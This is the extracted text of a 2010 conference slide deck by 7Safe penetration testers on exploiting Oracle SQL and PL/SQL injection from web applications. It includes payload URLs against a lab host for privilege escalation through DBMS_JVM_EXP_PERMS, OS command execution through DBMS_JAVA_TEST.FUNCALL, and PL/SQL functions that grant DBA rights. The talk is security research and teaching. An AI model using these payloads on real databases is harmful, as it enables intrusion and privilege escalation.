Dan Haagman, InfoSecurity 2009
HACKING                
FROM WEB APPS
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
1
Sumit Siddharth
Aleksander Gorkowienko
7Safe, UK
Dan Haagman, InfoSecurity 2009
 Pentesters @7safe
 Specialize in Application Security
About US
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
2
 Speaker at Defcon, OWASP Appsec, Troopers, Sec-T etc
 Not an Oracle Geek 
Dan Haagman, InfoSecurity 2009
What this presentation will be about? ;-) ...
…No no no. 
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
3
…No no no. 
Not this time ;-)…
Dan Haagman, InfoSecurity 2009
 Exploiting SQL Injections from web apps 
against Oracle database
– Introduction [5 mins]
– PL/SQL vs SQL Injection [5 mins]
– Extracting Data [5 mins]
The real agenda ;-)
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
4
– Extracting Data [5 mins]
– Privilege Escalation [5 mins]
– OS Code Execution [15 mins]
– Second Order Attacks [10 mins]
 PCI Compliance and SQL Injection [10 min]
Dan Haagman, InfoSecurity 2009
 The talk presents the work of a number of Oracle 
security researchers in the context of web application 
security. 
 Specially David Litchfield
About the talk
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
5
 Specially David Litchfield
 Other researchers we would like to thank:
– Alexander Kornbrust
– Ferruh Mavituna
Dan Haagman, InfoSecurity 2009
 Oracle database installation comes with a number of 
default packages, procedures, functions etc.
 By default these procedures/functions run with the 
privilege of definer
 To change the execution privileges from definer to 
Oracle Privileges
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
6
 To change the execution privileges from definer to 
invoker keyword AUTHID CURRENT_USER must be 
defined.
Dan Haagman, InfoSecurity 2009
If there is a SQL Injection 
in a procedure owned by 
SYS and PUBLIC has 
Exploiting Oracle From Internal Networks
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
7
SYS and PUBLIC has 
execute privileges, then its 
“game over”…
Dan Haagman, InfoSecurity 2009
 Enumerate SID
 Enumerate users
 Connect to oracle
 Exploit SQL injection in a 
procedure owned by SYS
Owning oracle from network
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
8
procedure owned by SYS
 Become DBA
 Execute OS Code
 Metasploit is your friend…
Dan Haagman, InfoSecurity 2009
E.g.
 exec SYS.LT.MERGEWORKSPACE(‘foobar'' and 
SCOTT.DBA()=''Y');
 The function SCOTT. DBA() will be executed by SYS as it 
Exploiting Oracle From Internal Networks...
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
9
 The function SCOTT. DBA() will be executed by SYS as it 
is called by the procedure
 SCOTT.DBA() has AUTHID CURRENT_USER defined.
Dan Haagman, InfoSecurity 2009
 PL/SQL: Coding language embedded in 
Oracle.
 free floating code wrapped between 
begin and end.
 E.g.
PL/SQL vs SQL
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
10
 E.g.
Begin
Scott.procedure1(‘input1’);
Scott.procedure2(‘input2);
End;
Dan Haagman, InfoSecurity 2009
 SQL is a limited language that allows you to directly 
interact with the database.
 You can write queries (SELECT), manipulate data and 
objects (DDL, DML) with SQL. However, SQL doesn't 
include all the things that normal programming 
PL/SQL vs SQL
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
11
include all the things that normal programming 
languages have, such as loops and IF...THEN...ELSE 
statements.
 Most importantly, SQL do not support execution of 
multiple statements.
Dan Haagman, InfoSecurity 2009
 SQL in Oracle does not support execution of multiple 
statements.
 OS code execution is not as simply as executing 
xp_cmdshell in MSSQL.
 Not enough documentation on which exploits can be 
Challenges in Exploiting Oracle From Web Apps
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
12
 Not enough documentation on which exploits can be 
used from web applications.
 Not many publicly available tools for exploiting Oracle 
SQL Injections.
Dan Haagman, InfoSecurity 2009
PL/SQL vs SQL Injection
2 Classes of Vulnerabilities
PL/SQL Injection
• Injection in 
Anonymous 
SQL Injection
• Injection in Single SQL 
Statement
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
13
Anonymous 
PL/SQL block
• No Restriction
• Execute DDL, DML
• Easy
Statement
• Restrictions
• No ';' allowed
• Difficult
Dan Haagman, InfoSecurity 2009
Php code at web server:
Dan Haagman, InfoSecurity 2009
E.g
 At database:
CREATE OR REPLACE PROCEDURE 
SCOTT.TEST( Q IN VARCHAR2) AS
PL/SQL Injection 
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
15
SCOTT.TEST( Q IN VARCHAR2) AS
BEGIN
EXECUTE IMMEDIATE ('BEGIN 
'||Q||';END;');
END;
Dan Haagman, InfoSecurity 2009
 David Litchfield showed an exploit at Blackhat
DC, 2010
 Allows a user with create session privs to grant 
himself java IO permissions
DBMS_JVM_EXP_PERMS exploit
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
16
himself java IO permissions
 Once java IO permissions are obtained he can 
become dba or directly execute OS code
 Fixed in April 2010 CPU
Dan Haagman, InfoSecurity 2009
http://192.168.2.10/ora9.php?name=NULL
http://192.168.2.10/ora9.php?name=NULL; 
execute immediate 'DECLARE POL 
DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY; CURSOR 
C1 IS SELECT 
PL/SQL Injection: Privilege Escalation
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
17
C1 IS SELECT 
''GRANT'',user(),''SYS'',''java.io.FilePermis
sion'',''>'',''execute'',''ENABLED'' FROM 
DUAL;BEGIN OPEN C1; FETCH C1 BULK
COLLECT INTO POL;CLOSE
C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);E
ND;';end;--
Dan Haagman, InfoSecurity 2009
http://192.168.2.10/ora9.php?name=null
;declare aa varchar2(200);begin 
execute immediate 'Select 
DBMS_JAVA_TEST.FUNCALL(''oracle/aurora
PL/SQL Injection: OS Code execution
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
18
DBMS_JAVA_TEST.FUNCALL(''oracle/aurora
/util/Wrapper'',''main'',''c:\\windows
\\system32\\cmd.exe'',''/c'',''dir >> 
c:\\0wned.txt'') FROM DUAL' into 
aa;end;end;--
Dan Haagman, InfoSecurity 2009
Oracle Portal component in Oracle Application 
Server 9.0.4.3, 10.1.2.2, and 10.1.4.1
– CVE ID: 2008-2589: WWV_RENDER_REPORT package’s 
SHOW procedure vulnerable to PL/SQL injection.
– CPU, July 2008: PL/SQL Injection in Oracle Application 
PL/SQL in Oracle Apps
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
19
– CPU, July 2008: PL/SQL Injection in Oracle Application 
Server (WWEXP_API_ENGINE)
Dan Haagman, InfoSecurity 2009
 Execute “Any” procedure is quite high privilege, still 
not equivalent to DBA
 “Any” implies any, other then procedures in SYS 
schema
 SQL Injection in mdsys.reset_inprog_index() 
Becoming DBA from execute “Any” procedure privilege
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
20
 SQL Injection in mdsys.reset_inprog_index() 
procedure
– Procedure is owned by mdsys user and not sys
– Mdsys has create any trigger privilege
– Create Any trigger, gives us DBA
• By default public do not have execute privileges on 
mdsys.reset_inprog_index() 
Dan Haagman, InfoSecurity 2009
Create or replace function scott.z return int
as
Begin 
Execute immediate ‘grant dba to scott’;
Return 1;
End;
Indirect Privilege Escalation
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
21
End;
grant execute on scott.fn2 to public;
Mdsys do not have dba role, so injecting this function will 
not help.
Dan Haagman, InfoSecurity 2009
Lets assume scott has privileges to call this procedure:
He creates another function…
create or replace function fn2 return int
authid current_user is
pragma autonomous_transaction;
BEGIN
Indirect Privilege escalation
7Safe Company Overview 2009
Secure Coding Course, © 7Safe